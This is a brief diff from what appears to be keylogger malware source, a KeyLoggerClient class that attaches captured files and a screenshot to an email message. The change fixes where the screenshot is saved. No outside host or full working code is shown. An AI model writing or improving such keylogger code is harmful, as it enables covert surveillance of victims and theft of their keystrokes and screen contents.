@@ -114,7 +114,7 @@ class KeyLoggerClient:
 					file_attachment.add_header('Content-Disposition', "attachment; filename=" + filename)
 					msg.attach(file_attachment)
 
-					take_screenshot()
+					take_screenshot(temp_path)
 					with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
 						image_attachment.set_payload(handler.read())
 
